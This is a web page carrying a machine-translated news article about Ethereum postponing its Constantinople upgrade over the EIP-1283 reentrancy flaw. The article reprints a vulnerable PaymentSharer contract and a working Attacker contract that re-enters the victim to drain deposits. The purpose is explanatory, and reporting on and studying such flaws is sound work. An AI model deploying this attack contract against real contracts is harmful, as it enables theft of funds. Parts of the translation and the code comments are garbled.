<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>* Ethereum "Constantinople" update postponed due to a potential vulnerability found at the last moment</title>
  <meta name="description" content="* Many people call this event ‚Äúhard fork‚Äù, but ‚ÄúAcne‚Äù is against . 

 The long-awaited release of Constantinople was to be held on January 17, at 4AM ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({
      google_ad_client: "ca-pub-6974184241884155",
      enable_page_level_ads: true
    });
  </script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="https://quick-geek.github.io/search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <section class="page js-page"><h1>* Ethereum "Constantinople" update postponed due to a potential vulnerability found at the last moment</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/d53/c1f/e6f/d53c1fe6fac80caca00053e4f7139f60.jpg" alt="image"><br>  <i>* Many people call this event ‚Äúhard fork‚Äù, but ‚ÄúAcne‚Äù is <a href="https://twitter.com/VitalikButerin/status/1083450179347394560">against</a> .</i> <br><br>  The long-awaited release of Constantinople was to be held <a href="https://www.coindesk.com/what-to-expect-when-ethereums-constantinople-hard-fork-happens">on January 17, at 4AM UTC</a> , however, once again it would be hard for the countless army of developers <a href="https://www.reddit.com/r/ethereum/comments/agcmiq/nethermind_constantinople_countdown_092_available/">countdown counters</a> to break off. <br><a name="habracut"></a><br>  30 hours before the official release, due to the found vulnerability, guided by the principle ‚Äúit is better to perebidit, than nedobdit‚Äù, the update was postponed indefinitely. <br><br>  An event that lifted the whole community, was the rash offer of <a href="https://eips.ethereum.org/EIPS/eip-1283">EIP 1283</a> , which reduced the cost of executing the SSTORE instruction (sic!).  In general, one of the main directions of the update was to reduce the cost and speed up the implementation of particularly heavy instructions. <br><br>  The events of January 15 developed <a href="https://blog.ethereum.org/2019/01/15/security-alert-ethereum-constantinople-postponement/">as follows</a> (time in PST): <br><br><ul><li>  at 8 am ChainSecurity publishes a <a href="https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9">description of the vulnerability</a> ; </li><li>  right there, Martin Holst Swende (the main security officer at the Ethereum Foundation) wakes up all the key developers, reminding you that some 37 hours are left before the update, and here we <a href="https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9">are</a> ; </li><li>  before noon there are heated debates in chat rooms and "voice"; </li><li>  for dinner, it was decided to cancel the update. </li></ul><br>  The situation was aggravated by the fact that the time to deploy the ship was chosen extremely poorly: almost half of the nodes had time to update, and all the others were methodically and aggressively kicked over the past weeks.  As a result, now the updated nodes will need to be updated again (either up or down ... well).  And who did not have time and overslept everything - those are great, they do not need to do anything. <br><br>  Then everything was predictable - the market reacted with a course of ether (haha) that collapsed by 5%.  Many, of course, were perturbed saying that how this price of instruction can influence security, why did you commit code there and so on ... But in fact, nothing unusual, everything is like everyone else. <br><br>  It is better to read about the technical details of the vulnerability in the original article from <a href="https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9">ChainSecurity</a> , it‚Äôs not difficult to figure it out. <br><br>  If you are too lazy to dive into the code, the bottom line is that before the update, the SSTORE instruction cost so much that there was no way to change the ‚Äúrepository‚Äù (state) from other contracts, after the update of Constantinople, the instruction fell in price (), and you can change the ‚Äúrepository‚Äù many times, thereby changing the logic of the vulnerable contract. <br><br>  The contract code (with my comments): <br><br><pre><code class="plaintext hljs">pragma solidity ^0.5.0; contract PaymentSharer { mapping(uint =&gt; uint) splits; mapping(uint =&gt; uint) deposits; mapping(uint =&gt; address payable) first; mapping(uint =&gt; address payable) second; // –∑–¥–µ—Å—å –º—ã –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –ø–∞—Ä–æ–π –∞–¥—Ä–µ—Å–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –≤ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–∏ –±—É–¥—É—Ç –¥–µ–ª–∏—Ç—å –¥–µ–ø–æ–∑–∏—Ç (–Ω–µ–∫—É—é —Å—É–º–º—É –¥–µ–Ω–µ–≥) function init(uint id, address payable _first, address payable _second) public { require(first[id] == address(0) &amp;&amp; second[id] == address(0)); require(first[id] == address(0) &amp;&amp; second[id] == address(0)); first[id] = _first; second[id] = _second; } // –∫–ª–∞–¥–µ–º —Å—É–º–º—É –Ω–∞ –¥–µ–ø–æ–∑–∏—Ç, –∫–æ—Ç–æ—Ä—ã–π –≤ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–∏ –±—É–¥—É—Ç –¥–µ–ª–∏—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–∏ function deposit(uint id) public payable { deposits[id] += msg.value; } // –∑–∞–¥–∞–µ–º –≤ –∫–∞–∫–æ–π –ø—Ä–æ–ø–æ—Ä—Ü–∏–∏ –¥–µ–ª–∏—Ç—å –¥–µ–ø–æ–∑–∏—Ç function updateSplit(uint id, uint split) public { require(split &lt;= 100); splits[id] = split; } // –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ, –¥–µ–ª–µ–∂ (–≤ —Å–æ–æ—Ç–≤–µ—Ç—Å–≤—Ç–∏–∏ —Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–π –ø—Ä–æ–ø–æ—Ä—Ü–∏–µ–π split) function splitFunds(uint id) public { // Here would be: // Signatures that both parties agree with this split // Split address payable a = first[id]; address payable b = second[id]; uint depo = deposits[id]; deposits[id] = 0; // –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –¥–æ–ª—é –ø–µ—Ä–≤–æ–º—É —É—á–∞—Å—Ç–Ω–∏–∫—É (–∑–¥–µ—Å—å –≤ –∞—Ç–∞–∫–µ –≤—ã–∑–æ–≤–µ—Ç—Å—è fallback-–º–µ—Ç–æ–¥ –∏–∑ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ –Ω–∏–∂–µ) a.transfer(depo * splits[id] / 100); // –æ—Å—Ç–∞—Ç–æ–∫ - –≤—Ç–æ—Ä–æ–º—É —É—á–∞—Å—Ç–Ω–∏–∫—É (–∑–¥–µ—Å—å –≤ –∞—Ç–∞–∫–µ –¥–µ–ø–æ–∑–∏—Ç —É–π–¥–µ—Ç –Ω–∞ –∫–æ—à–µ–ª—å –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞) b.transfer(depo * (100 - splits[id]) / 100); } }</code> </pre> <br>  The code of the attacking contract: <br><br><pre> <code class="plaintext hljs">pragma solidity ^0.5.0; import "./PaymentSharer.sol"; contract Attacker { address private victim; address payable owner; constructor() public { owner = msg.sender; } // –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤—ã–∑—ã–≤–∞–µ—Ç —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é*, –ø–µ—Ä–µ–¥–∞–≤ –µ–π –∞–¥—Ä–µ—Å —É—è–∑–≤–∏–º–æ–≥–æ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ PaymentSharer –≤ —Å–µ—Ç–∏ function attack(address a) external { victim = a; PaymentSharer x = PaymentSharer(a); x.updateSplit(0, 100); x.splitFunds(0); } // fallback –º–µ—Ç–æ–¥, –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –Ω–∞ transfer-–µ function () payable external { address x = victim; // —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ, —Å–∞–º–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –∞—Å—Å–µ–º–±–ª–µ—Ä–Ω–æ–π –≤—Å—Ç–∞–≤–∫–µ –Ω–∏–∂–µ (–Ω–µ —á—Ç–æ –∏–Ω–æ–µ, –∫–∞–∫ –≤—ã–∑–æ–≤ updateSplit(0, 0)), —Ç.–µ. –Ω–∞–≥–ª–æ –º–µ–Ω—è–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä Split –≤—Ç–æ—Ä–æ–π —Ä–∞–∑ –∏ –æ–ø—è—Ç—å –∑–∞–≥–æ–Ω—è–µ–º —Å–µ–±–µ –ø–æ–ª–Ω—É—é —Å—É–º–º—É –¥–µ–ø–æ–∑–∏—Ç–∞ assembly{ mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000) pop(call(10000, x, 0, 0x80, 0x44, 0, 0)) } } function drain() external { owner.transfer(address(this).balance); } }</code> </pre><br>  * missing in the original, but there must be an initialization of the form somewhere: <br><blockquote>  init (0, "address of contract Attacker", "address of the attacker's purse") </blockquote><br>  before calling the attack method. <br><br>  Of course, there are a lot of questions about the PaymentSharer contract itself, on which we are shown vulnerability, it is in itself crookedly crooked, and that‚Äôs the problem, <br>  and not in the price of SSTORE, and in general - they did not find a single living example in the release network, but they decided to be safe, all the cost of the error may be too high (everyone remembered the long-standing DAO). <br><br>  In general, the Ethereum community is full of interesting events: the struggle of the gray cardinals of the market (GPU vs ASIC) has intensified, which in itself deserves a separate article, the upcoming release of Bacon Chain is gaining momentum - the year promises to be rich in events and intrigue. </div><p>Source: <a href="https://habr.com/ru/post/436262/">https://habr.com/ru/post/436262/</a></p>
<section class="navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container">Waiting for the list from <a href="../../index.html">here</a>...</nav>
</section>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52319614 = new Ya.Metrika({
                  id:52319614,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52319614" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>
</body>

</html>